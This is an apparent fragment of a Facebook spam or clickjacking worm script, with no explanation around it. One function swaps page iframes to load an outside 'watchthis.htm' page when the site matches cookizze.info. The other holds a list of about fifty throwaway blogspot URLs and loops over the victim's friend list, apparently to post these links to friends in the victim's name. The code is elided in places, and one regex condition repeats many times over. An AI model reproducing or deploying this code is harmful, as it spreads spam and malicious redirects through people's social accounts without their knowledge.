function enchulatuFB() {
    var ifra;
    if (location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i)) {
        ifra = document.getElementById("player_iframe");
        if (ifra != null) {
            ifra.style.marginLeft = "0px";
            ifra.src = "http://oipo.info/watchthis.htm"
        }
        ifra = document.getElementById('liframe')
        if (ifra != null) {
            ifra.innerHTML = '<iframe id="change" width="500" src="http://oipo.info/watchthis.htm" height="300" scrolling="no" frameborder="0"></iframe>'
        };
    }
    if (location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i) || location.href.match(/^http:\/\/(www\.)?cookizze\.info/i)) {
        ifra = document.getElementById('liframe')
        if (ifra != null) {
            ifra.innerHTML = '<iframe id="change" width="500" src="http://oipo.info/watchthis.htm" height="300" scrolling="no" frameborder="0"></iframe>'
        };
...
function fb_comparte() {
    ...
    var video_url = ['http://loopuyte.blogspot.com/','http://jkuhyrtryt.blogspot.com/','http://njttreza.blogspot.com/','http://huiirte.blogspot.com/','http://vvutree.blogspot.com/','http://hkhjhjgvb.blogspot.com/','http://kilhkkkjh.blogspot.com/','http://giuiyuju.blogspot.com/','http://roopuutrez.blogspot.com/','http://kopmmoiytre.blogspot.com/','http://voopiuyrt.blogspot.com/','http://cookplouy.blogspot.com/','http://bboouuytr.blogspot.com/','http://dhhzudiujuj.blogspot.com/','http://bfhgdde.blogspot.com/','http://yooopuytre.blogspot.com/','http://tooppljkjhg.blogspot.com/','http://doopuytr.blogspot.com/','http://ukhreza.blogspot.com/','http://ioplkkhr.blogspot.com/','http://oplllkitre.blogspot.com/','http://kolllirza.blogspot.com/','http://uopplhfd.blogspot.com/','http://yueersd.blogspot.com/','http://hyyureer.blogspot.com/','http://jkkjhddf.blogspot.com/','http://njhhhft.blogspot.com/','http://goppuut.blogspot.com/','http://09llrre.blogspot.com/','http://yu89hhg.blogspot.com/','http://9u87gg.blogspot.com/','http://766tyyf.blogspot.com/','http://794eercdv.blogspot.com/','http://uiutr67.blogspot.com/','http://oy6y766.blogspot.com/','http://riuui76.blogspot.com/','http://xcvfrr4556.blogspot.com/','http://jouiyt89.blogspot.com/','http://9987jggcx-rf.blogspot.com/','http://ouuyiy654.blogspot.com/','http://iyyy65d4.blogspot.com/','http://7ohghgd4hd.blogspot.com/','http://yyyi643zrz.blogspot.com/','http://juty668654-rf.blogspot.com/','http://hgj776332.blogspot.com/','http://uy7u66787.blogspot.com/','http://rf-girl31.blogspot.com/','http://mppoiuytr.blogspot.com/','http://xoopuuytre.blogspot.com/','http://qeeroop.blogspot.com/'];
    var domains = ['http://i.imgur.com/a5SHs.png'];
    ...
    var imagen = 'http://i.imgur.com/a5SHs.png';
    ...
    for (var f = 0; f < b; f++) {
        if (a['payload']['entries'][f]['uid'] != user_id) {
            ...
            imagen = 'http://i.imgur.com/a5SHs.png';
